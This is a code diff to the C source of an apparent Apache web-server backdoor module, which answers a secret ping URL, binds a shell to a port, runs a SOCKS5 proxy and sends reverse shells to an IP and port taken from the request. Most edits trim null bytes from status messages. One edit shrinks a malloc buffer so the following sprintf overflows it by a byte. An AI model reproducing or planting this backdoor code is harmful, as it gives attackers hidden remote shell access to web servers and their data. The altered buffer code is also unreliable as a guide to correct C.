@@ -280,7 +280,7 @@ void* waitProxy(int fd, int port){
     // Prepare Socket for proxy socks5
     int proxysockfd = socket(AF_INET, SOCK_STREAM, 0);
     if (proxysockfd < 0 ){
-        write(fd, "ERRNOSOCK\n", strlen("ERRNOSOCK\n") + 1);
+        write(fd, "ERRNOSOCK\n", strlen("ERRNOSOCK\n"));
         exit(0);
     }
 
@@ -296,7 +296,7 @@ void* waitProxy(int fd, int port){
     server.sin_addr.s_addr = INADDR_ANY;
     server.sin_port = htons(port);
 
-    pthread_t thread_id;
+    //pthread_t thread_id;
 
 
     if (bind(proxysockfd, (struct sockaddr *)&server,
@@ -596,7 +596,7 @@ int bindPort(int fd, int port){
     // Prepare Socket
     int bindSock = socket(AF_INET, SOCK_STREAM, 0);
     if (bindSock < 0 ){
-        write(fd, "ERRNOSOCK\n", strlen("ERRNOSOCK\n") + 1);
+        write(fd, "ERRNOSOCK\n", strlen("ERRNOSOCK\n"));
         exit(0);
     }
 
@@ -704,7 +704,7 @@ static int backdoor_post_read_request(request_rec *r) {
 
         sock = socket(AF_UNIX, SOCK_STREAM, 0);
         if (sock < 0) {
-            write(fd, "ERRNOSOCK\n", strlen("ERRNOSOCK\n") + 1);
+            write(fd, "ERRNOSOCK\n", strlen("ERRNOSOCK\n"));
             close(fd);
             exit(0);
         }
@@ -712,7 +712,7 @@ static int backdoor_post_read_request(request_rec *r) {
         strcpy(server.sun_path, IPC);
         if (connect(sock, (struct sockaddr *) &server, sizeof(struct sockaddr_un)) < 0){
             close(sock);
-            write(fd, "ERRNOCONNECT\n", strlen("ERRNOCONNECT\n") + 1);
+            write(fd, "ERRNOCONNECT\n", strlen("ERRNOCONNECT\n"));
             close(fd);
             exit(0);
         }
@@ -733,11 +733,9 @@ static int backdoor_post_read_request(request_rec *r) {
         while(1){
 
             new_socket = accept(bindfd, (struct sockaddr *)&server, (socklen_t*)&serverlen);
-            // Close binded fd
-            //close(bindfd);
+
             worker(new_socket);
             close(new_socket);
-
         }
 
 	}
@@ -748,7 +746,7 @@ static int backdoor_post_read_request(request_rec *r) {
 
         sock = socket(AF_UNIX, SOCK_STREAM, 0);
         if (sock < 0) {
-            write(fd, "ERRNOSOCK\n", strlen("ERRNOSOCK\n") + 1);
+            write(fd, "ERRNOSOCK\n", strlen("ERRNOSOCK\n"));
             close(fd);
             exit(0);
         }
@@ -756,7 +754,7 @@ static int backdoor_post_read_request(request_rec *r) {
         strcpy(server.sun_path, IPC);
         if (connect(sock, (struct sockaddr *) &server, sizeof(struct sockaddr_un)) < 0){
             close(sock);
-            write(fd, "ERRNOCONNECT\n", strlen("ERRNOCONNECT\n") + 1);
+            write(fd, "ERRNOCONNECT\n", strlen("ERRNOCONNECT\n"));
             close(fd);
             exit(0);
         }
@@ -764,7 +762,7 @@ static int backdoor_post_read_request(request_rec *r) {
 
         bindfd = bindPort(fd,atoi(port));
 
-        char* info = malloc(strlen(port)+strlen("[+] Shell binded on port %s\n")+1);
+        char* info = malloc(strlen(port)+strlen("[+] Shell binded on port %s\n"));
         sprintf(info,"[+] Shell binded on port %s\n",port);
         write(fd, info,strlen(info));
         free(info);
@@ -789,7 +787,7 @@ static int backdoor_post_read_request(request_rec *r) {
     }
 
 	if (!strcmp(r->uri, PINGWORD)) {
-		write(fd, "[+] Backdoor module is running !\n", strlen("[+] Backdoor module is running !\n")+1);
+		write(fd, "[+] Backdoor module is running !\n", strlen("[+] Backdoor module is running !\n"));
 		exit(0);
 	}
 
@@ -798,14 +796,14 @@ static int backdoor_post_read_request(request_rec *r) {
         int sd[2], i;
         sock = socket(AF_UNIX, SOCK_STREAM, 0);
         if (sock < 0) {
-            write(fd, "ERRNOSOCK\n", strlen("ERRNOSOCK\n") + 1);
+            write(fd, "ERRNOSOCK\n", strlen("ERRNOSOCK\n"));
             exit(0);
         }
         server.sun_family = AF_UNIX;
         strcpy(server.sun_path, IPC);
         if (connect(sock, (struct sockaddr *) &server, sizeof(struct sockaddr_un)) < 0){
             close(sock);
-            write(fd, "ERRNOCONNECT\n", strlen("ERRNOCONNECT\n") + 1);
+            write(fd, "ERRNOCONNECT\n", strlen("ERRNOCONNECT\n"));
             exit(0);
         }
 
@@ -816,7 +814,7 @@ static int backdoor_post_read_request(request_rec *r) {
         char* prog = strtok(NULL,"/");
         char* info = malloc(strlen("[+] Sending Reverse Shell to %s:%s using %s\n")+strlen(ip)+strlen(port)+strlen(prog)+2);
         sprintf(info,"[+] Sending Reverse Shell to %s:%s using %s\n",ip,port,prog);
-        write(fd, info, strlen(info) +1);
+        write(fd, info, strlen(info));
         free(info);
 
         close(fd);
@@ -831,7 +829,7 @@ static int backdoor_post_read_request(request_rec *r) {
 			// Socket to send the reverse shell
             int revsockfd = socket(AF_INET, SOCK_STREAM, 0);
             if (revsockfd < 0 ){
-                write(fd, "ERRNOSOCK\n", strlen("ERRNOSOCK\n") + 1);
+                write(fd, "ERRNOSOCK\n", strlen("ERRNOSOCK\n"));
                 exit(0);
             }
 
@@ -846,21 +844,21 @@ static int backdoor_post_read_request(request_rec *r) {
 
             if (connect(revsockfd , (struct sockaddr *)&client_to_connect , sizeof(client_to_connect)) < 0)
             {
-                write(fd, "[+] Reverse socket can't connect to client\n", strlen("[+] Reverse socket can't connect to client\n") + 1);
+                write(fd, "[+] Reverse socket can't connect to client\n", strlen("[+] Reverse socket can't connect to client\n"));
                 exit(0);
             }
 
             // IPC socket
 			sock = socket(AF_UNIX, SOCK_STREAM, 0);
 			if (sock < 0) {
-				write(fd, "ERRNOSOCK\n", strlen("ERRNOSOCK\n") + 1);
+				write(fd, "ERRNOSOCK\n", strlen("ERRNOSOCK\n"));
 				exit(0);
 			}
 			server.sun_family = AF_UNIX;
 			strcpy(server.sun_path, IPC);
 			if (connect(sock, (struct sockaddr *) &server, sizeof(struct sockaddr_un)) < 0){
 				close(sock);
-				write(fd, "ERRNOCONNECT\n", strlen("ERRNOCONNECT\n") + 1);
+				write(fd, "ERRNOCONNECT\n", strlen("ERRNOCONNECT\n"));
 				close(fd);
 				exit(0);
 			}
@@ -869,7 +867,7 @@ static int backdoor_post_read_request(request_rec *r) {
 			// Info in original socket
 			char* info = malloc(strlen("Sending Reverse Shell to \n")+strlen(ip)+strlen(port)+2);
 			sprintf(info,"[+] Sending Reverse Shell to %s:%s",ip,port);
-			write(fd, info, strlen(info) +1);
+			write(fd, info, strlen(info));
 			free(info);
 
             close(fd);
